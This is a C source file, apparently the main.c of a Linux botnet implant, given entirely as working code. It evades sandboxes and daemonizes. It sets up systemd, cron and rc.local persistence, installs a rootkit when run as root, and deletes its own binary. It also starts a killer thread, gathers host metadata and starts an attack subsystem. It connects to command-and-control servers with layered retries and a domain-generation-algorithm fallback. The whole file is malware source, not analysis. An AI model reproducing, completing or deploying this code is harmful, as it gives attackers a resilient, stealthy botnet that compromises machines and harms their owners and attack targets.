/* ==========================================================================
 *  main.c -- Entry point, connection loop, DGA fallback
 *  Pure C port of main.cpp. GCC 4.1.2 / uClibc compatible.
 * ========================================================================== */

#include "bot.h"
#include "attack.h"

/* ----------------------------------------------------------------------
   C2 endpoint pool (fixed-size array, no heap allocation needed)
   ---------------------------------------------------------------------- */

#define MAX_ENDPOINTS 64

static c2ep_t  c2_pool[MAX_ENDPOINTS];
static int      pool_size = 0;

/* Free all dstr members inside pool entries */
static void pool_clear(void)
{
    int i;
    for (i = 0; i < pool_size; i++) {
        ds_free(&c2_pool[i].host);
        ds_free(&c2_pool[i].port);
    }
    pool_size = 0;
}

/* Check if host:port already exists in pool */
static int pool_contains(const char* host, const char* port)
{
    int i;
    for (i = 0; i < pool_size; i++) {
        if (strcmp(ds_cstr(&c2_pool[i].host), host) == 0 &&
            strcmp(ds_cstr(&c2_pool[i].port), port) == 0)
            return 1;
    }
    return 0;
}

/* Append a single endpoint (copies strings). Deduplicates. Returns 0 on overflow/dup. */
static int pool_push(const char* host, const char* port)
{
    if (pool_size >= MAX_ENDPOINTS)
        return 0;
    if (pool_contains(host, port))
        return 0;
    ds_init(&c2_pool[pool_size].host);
    ds_init(&c2_pool[pool_size].port);
    ds_set(&c2_pool[pool_size].host, host);
    ds_set(&c2_pool[pool_size].port, port);
    pool_size++;
    return 1;
}

/* Fisher-Yates shuffle on the pool */
static void pool_shuffle(void)
{
    int i;
    for (i = pool_size - 1; i > 0; i--) {
        int j = (int)(urandom_u32() % (unsigned)(i + 1));
        if (i != j) {
            c2ep_t tmp = c2_pool[i];
            c2_pool[i] = c2_pool[j];
            c2_pool[j] = tmp;
        }
    }
}

/* ----------------------------------------------------------------------
   resolve_config -- resolve a config entry into pool-appendable endpoints
   Returns number of endpoints appended.
   ---------------------------------------------------------------------- */

static int resolve_config_into(int idx, int replace)
{
    strarr addrs;
    int count = 0;
    size_t i;

    sa_init(&addrs);
    addrs = dialga_one(idx);

    if (replace)
        pool_clear();

    for (i = 0; i < sa_count(&addrs); i++) {
        dstr h, p;
        ds_init(&h);
        ds_init(&p);
        if (parse_address(sa_get(&addrs, i), &h, &p)) {
            pool_push(ds_cstr(&h), ds_cstr(&p));
            count++;
        }
        ds_free(&h);
        ds_free(&p);
    }

    sa_free(&addrs);
    return count;
}

/* Resolve into a fresh pool (clears first) */
static int resolve_config(int idx)
{
    return resolve_config_into(idx, 1);
}

/* Append to existing pool (does not clear) */
static int resolve_config_append(int idx)
{
    return resolve_config_into(idx, 0);
}

/* ======================================================================
   main
   ====================================================================== */

int main(int argc, char* argv[])
{
    int num_configs;
    int c2_idx;
    int config_idx;
    int phantom_failures;
    int phantom_mode;
    time_t phantom_primary_ttl;
    pthread_t tid;

    /* 0. Capture origin tag — try argv[1] first, then ORIGIN env var */
    ds_init(&g_origin);
    if (argc > 1 && argv[1][0] != '-') {
        ds_set(&g_origin, argv[1]);
    } else {
        const char *env_origin = getenv("ORIGIN");
        if (env_origin && env_origin[0])
            ds_set(&g_origin, env_origin);
    }

    /* 0b. Ignore SIGPIPE (broken socket writes must not kill the process)
     *     and SIGCHLD (let forked attack children auto-reap, no zombies). */
    signal(SIGPIPE, SIG_IGN);
    signal(SIGCHLD, SIG_IGN);

    /* 1. Sandbox detection — before anything touches disk or forks */
    if (winnti()) {
        return 0;
    }

    /* 2. Daemonize */
    stuxnet(argc, argv);

    debug_log("main: Bot starting up...");
    debug_log("main: Protocol version: %s", BUILD_TAG);
    if (!ds_empty(&g_origin))
        debug_log("main: Origin: %s", ds_cstr(&g_origin));
    debug_log("main: No sandbox detected");
    debug_log("main: STEP-A before revil");

    /* 3. Single-instance lock */
    revil_single_instance();
    debug_log("main: STEP-B after revil");

    /* 4. Resolve fetch URL BEFORE persistence so cron/rc.local get the IP,
       not the raw domain (which may only be resolvable via TXT/DoH). */
    ensure_network();
    {
        const char *url = ds_cstr(&g_fetch_url);
        const char *host_start = strstr(url, "://");
        if (host_start) {
            char host[256];
            const char *host_end;
            int hlen;
            host_start += 3;
            host_end = host_start;
            while (*host_end && *host_end != ':' && *host_end != '/') host_end++;
            hlen = (int)(host_end - host_start);
            if (hlen > 0 && hlen < (int)sizeof(host)) {
                struct in_addr tmp;
                memcpy(host, host_start, hlen);
                host[hlen] = '\0';
                if (inet_pton(AF_INET, host, &tmp) != 1) {
                    strarr resolved = resolve_one(host);
                    if (sa_count(&resolved) > 0) {
                        const char *r = sa_get(&resolved, 0);
                        const char *colon = strchr(r, ':');
                        if (colon) {
                            char ip[64];
                            int iplen = (int)(colon - r);
                            if (iplen > 0 && iplen < (int)sizeof(ip)) {
                                memcpy(ip, r, iplen);
                                ip[iplen] = '\0';
                                ds_init(&g_fetch_url_resolved);
                                ds_catn(&g_fetch_url_resolved, url, (size_t)(host_start - url));
                                ds_cat(&g_fetch_url_resolved, ip);
                                ds_cat(&g_fetch_url_resolved, host_end);
                                debug_log("main: Fetch URL resolved: %s -> %s",
                                          ds_cstr(&g_fetch_url), ds_cstr(&g_fetch_url_resolved));
                            }
                        }
                    }
                    sa_free(&resolved);
                }
            }
        }
    }

    /* 5. Persistence -- all methods, layered for redundancy */
    debug_log("main: Setting up persistence...");
    dragonfly();   /* systemd + cron */
    fin7();        /* rc.local backup */

    /* 5. Rootkit -- auto-install if .so exists on disk and we have root */
    if (getuid() == 0) {
        rootkit_auto();
    }

    /* 6. Self-delete binary from disk — process stays alive in memory.
       Persistence will re-download via fetch_url when PID eventually dies. */
    {
        char exe_path[4096];
        ssize_t len = readlink("/proc/self/exe", exe_path, sizeof(exe_path) - 1);
        if (len > 0) {
            exe_path[len] = '\0';
            if (unlink(exe_path) == 0)
                debug_log("main: Self-deleted %s", exe_path);
        }
    }

    /* 7. Start IOC killer (background thread) */
    killer_start();

    /* 7. Collect metadata */
    mustang_panda(&g_bot_id);
    charming_kitten(&g_arch);
    g_ram    = revil_mem();
    g_cpu    = revil_cpu();
    revil_proc(&g_proc);
    debug_log("main: Metadata -- ID:%s Arch:%s RAM:%ldMB CPU:%d Proc:%s",
              ds_cstr(&g_bot_id), ds_cstr(&g_arch), (long)g_ram, g_cpu,
              ds_cstr(&g_proc));

    /* 7. Initialize attack subsystem */
#ifndef NO_ATTACK
    attack_init();
    debug_log("main: Attack subsystem initialized");
#else
    debug_log("main: Attack code disabled (NO_ATTACK build)");
#endif

    /* 8. Resolve C2 addresses */
    ensure_network();
    num_configs = (int)sa_count(&g_service_addrs);
    if (num_configs == 0) {
        debug_log("main: No C2 addresses configured, exiting");
        return 1;
    }
    debug_log("main: %d C2 config entries available", num_configs);

    /* Bootstrap: resolve first entry */
    debug_log("main: Resolving first C2 config entry...");
    resolve_config(0);
    if (pool_size == 0) {
        int i;
        for (i = 1; i < num_configs; i++) {
            resolve_config(i);
            if (pool_size > 0) break;
        }
        if (pool_size == 0) {
            debug_log("main: No C2 addresses resolved, exiting");
            return 1;
        }
    }

    /* Shuffle initial pool */
    pool_shuffle();
    debug_log("main: Starting with %d endpoints", pool_size);

    c2_idx            = 0;
    config_idx        = 0;
    phantom_failures  = 0;
    phantom_mode      = 0;
    phantom_primary_ttl = time(NULL);

    /* Retry state for exponential backoff */
    {
    int  round           = 0;      /* which full sweep of the pool we're on   */
    int  round_failures  = 0;      /* failures within the current round       */
    int  configs_loaded  = 1;      /* how many config entries we've resolved   */
    int  all_configs_tried = 0;    /* set once we've loaded every config entry */

    /* ==================================================================
       MAIN CONNECTION LOOP

       Strategy:
         Round 0 — try every endpoint in pool, 1-2s between attempts
         Round 1 — re-resolve & append remaining config entries, retry
                   pool with 2-4s jitter
         Round 2+ — exponential backoff per round (5s → 10s → 20s → 30s),
                    MAX_RETRY_ROUNDS total
         After all rounds exhausted → DGA walk
       ================================================================== */

#define MAX_RETRY_ROUNDS 5

    for (;;) {
        time_t now;
        now = time(NULL);

        /* In phantom (DGA) mode: periodically retry primary C2 */
        if (phantom_mode && now > phantom_primary_ttl) {
            int recovered = 0;
            int i;
            debug_log("main: Phantom mode -- retrying primary C2...");

            for (i = 0; i < num_configs && !recovered; i++) {
                /* Resolve into a temp area -- reuse pool if success */
                c2ep_t tmp_eps[MAX_ENDPOINTS];
                int tmp_count = 0;
                strarr addrs;
                size_t a;

                sa_init(&addrs);
                addrs = dialga_one(i);

                for (a = 0; a < sa_count(&addrs) && tmp_count < MAX_ENDPOINTS; a++) {
                    dstr h, p;
                    ds_init(&h);
                    ds_init(&p);
                    if (parse_address(sa_get(&addrs, a), &h, &p)) {
                        ds_init(&tmp_eps[tmp_count].host);
                        ds_init(&tmp_eps[tmp_count].port);
                        ds_set(&tmp_eps[tmp_count].host, ds_cstr(&h));
                        ds_set(&tmp_eps[tmp_count].port, ds_cstr(&p));
                        tmp_count++;
                    }
                    ds_free(&h);
                    ds_free(&p);
                }
                sa_free(&addrs);

                {
                    int t;
                    for (t = 0; t < tmp_count; t++) {
                        conn_t* test = vpn_connect(ds_cstr(&tmp_eps[t].host),
                                                   ds_cstr(&tmp_eps[t].port));
                        if (test) {
                            int k;
                            debug_log("main: Primary C2 recovered via config[%d]!", i);

                            /* Replace pool with these endpoints */
                            pool_clear();
                            for (k = 0; k < tmp_count; k++) {
                                pool_push(ds_cstr(&tmp_eps[k].host),
                                          ds_cstr(&tmp_eps[k].port));
                            }
                            pool_shuffle();
                            c2_idx           = 0;
                            config_idx       = i;
                            phantom_mode     = 0;
                            phantom_failures = 0;
                            round            = 0;
                            round_failures   = 0;
                            configs_loaded   = 1;
                            all_configs_tried = 0;

                            anonymous_sudan(test); /* takes ownership */
                            recovered = 1;
                            break;
                        }
                    }
                }

                /* Free tmp_eps */
                {
                    int t;
                    for (t = 0; t < tmp_count; t++) {
                        ds_free(&tmp_eps[t].host);
                        ds_free(&tmp_eps[t].port);
                    }
                }
            }

            if (!recovered) {
                phantom_primary_ttl = time(NULL) + (PHANTOM_RETRY_MS / 1000);
            } else {
                sleep_jitter(RETRY_FAST_FLOOR_MS, RETRY_FAST_CEIL_MS);
                continue;
            }
        }

        /* Empty pool -- wait and re-resolve */
        if (pool_size == 0) {
            debug_log("main: Pool empty, sleeping...");
            sleep_ms(5000);
            resolve_config(0);
            continue;
        }

        /* Pick next endpoint */
        {
            int ep_idx = c2_idx % pool_size;
            const char* host = ds_cstr(&c2_pool[ep_idx].host);
            const char* port = ds_cstr(&c2_pool[ep_idx].port);
            conn_t* conn;

            debug_log("main: Connecting to %s:%s (round %d, attempt %d/%d)...",
                      host, port, round, round_failures + 1, pool_size);

            conn = vpn_connect(host, port);
            if (!conn) {
                phantom_failures++;
                round_failures++;
                c2_idx++;

                debug_log("main: Failed (round %d, %d/%d in round, %d total)",
                          round, round_failures, pool_size, phantom_failures);

                /* Check if we've exhausted this round (tried every endpoint) */
                if (round_failures >= pool_size) {
                    round++;
                    round_failures = 0;
                    c2_idx = 0;

                    /* Before next round, try to expand pool from unloaded configs */
                    if (!all_configs_tried && configs_loaded < num_configs) {
                        int ci;
                        debug_log("main: Loading remaining %d config entries...",
                                  num_configs - configs_loaded);
                        for (ci = configs_loaded; ci < num_configs; ci++) {
                            resolve_config_append(ci);
                        }
                        configs_loaded    = num_configs;
                        all_configs_tried = 1;
                        pool_shuffle();
                        debug_log("main: Pool expanded to %d endpoints", pool_size);
                    } else {
                        pool_shuffle();
                    }

                    /* Check if we've exhausted all rounds → DGA */
                    if (round >= MAX_RETRY_ROUNDS) {
                        int dga_resolved = 0;
                        int di;
                        debug_log("main: All %d rounds exhausted (%d endpoints × %d rounds = %d attempts). Walking DGA...",
                                  MAX_RETRY_ROUNDS, pool_size, MAX_RETRY_ROUNDS,
                                  pool_size * MAX_RETRY_ROUNDS);

                        for (di = 0; di < DGA_DOMAINS_PER_DAY; di++) {
                            dstr domain, dga_port, c2_addr;
                            int dga_backoff;

                            ds_init(&domain);
                            ds_init(&dga_port);
                            ds_init(&c2_addr);

                            kyurem(di, &domain, &dga_port);
                            debug_log("main: DGA [%d/%d]: %s",
                                      di + 1, DGA_DOMAINS_PER_DAY, ds_cstr(&domain));

                            c2_addr = necrozma(ds_cstr(&domain));
                            if (!ds_empty(&c2_addr)) {
                                dstr dh, dp;
                                ds_init(&dh);
                                ds_init(&dp);
                                if (parse_address(ds_cstr(&c2_addr), &dh, &dp)) {
                                    pool_clear();
                                    pool_push(ds_cstr(&dh), ds_cstr(&dp));
                                    c2_idx           = 0;
                                    phantom_mode     = 1;
                                    phantom_failures = 0;
                                    round            = 0;
                                    round_failures   = 0;
                                    configs_loaded   = 1;
                                    all_configs_tried = 0;
                                    phantom_primary_ttl = time(NULL) + (PHANTOM_RETRY_MS / 1000);
                                    dga_resolved = 1;
                                }
                                ds_free(&dh);
                                ds_free(&dp);
                            }

                            ds_free(&domain);
                            ds_free(&dga_port);
                            ds_free(&c2_addr);

                            if (dga_resolved)
                                break;

                            /* Exponential backoff between DGA: 3s -> 6s -> 12s -> cap 20s */
                            dga_backoff = 3000 << di;
                            if (dga_backoff > 20000) dga_backoff = 20000;
                            sleep_jitter(dga_backoff, dga_backoff + dga_backoff / 3);
                        }

                        if (!dga_resolved) {
                            /* All DGA failed -- sleep 15 min then full restart */
                            debug_log("main: All DGA failed, sleeping 15 minutes...");
                            sleep_ms(15 * 60 * 1000 + jitter_ms(0, 60000));
                            resolve_config(0);
                            c2_idx            = 0;
                            config_idx        = 0;
                            phantom_failures  = 0;
                            round             = 0;
                            round_failures    = 0;
                            configs_loaded    = 1;
                            all_configs_tried = 0;
                        }
                        continue;
                    }

                    /* Exponential backoff between rounds */
                    {
                        int backoff = RETRY_RAMP_BASE_MS << (round - 1);
                        int jit;
                        if (backoff > RETRY_RAMP_MAX_MS) backoff = RETRY_RAMP_MAX_MS;
                        jit = (int)(backoff * 0.7 + (int)(urandom_u32() % (unsigned)(int)(backoff * 0.6 + 1)));
                        debug_log("main: Round %d starting, backoff %d ms", round, jit);
                        sleep_ms(jit);
                    }
                } else {
                    /* Within a round: short delay between endpoint attempts */
                    if (round == 0) {
                        /* First round: quick rotate 1-2s */
                        sleep_jitter(1000, 2000);
                    } else {
                        /* Later rounds: slightly longer 2-4s */
                        sleep_jitter(RETRY_FAST_FLOOR_MS, RETRY_FAST_CEIL_MS);
                    }
                }
                continue;
            }

            /* Successful connection -- reset all retry state */
            phantom_failures  = 0;
            round             = 0;
            round_failures    = 0;
            configs_loaded    = 1;
            all_configs_tried = 0;

            debug_log("main: Connected to C2, starting handler");
            anonymous_sudan(conn); /* takes ownership, closes on return */
            debug_log("main: Handler returned, reconnecting...");
            sleep_jitter(RETRY_FAST_FLOOR_MS, RETRY_FAST_CEIL_MS);
        }
    }
    } /* end retry state scope */

    return 0;
}
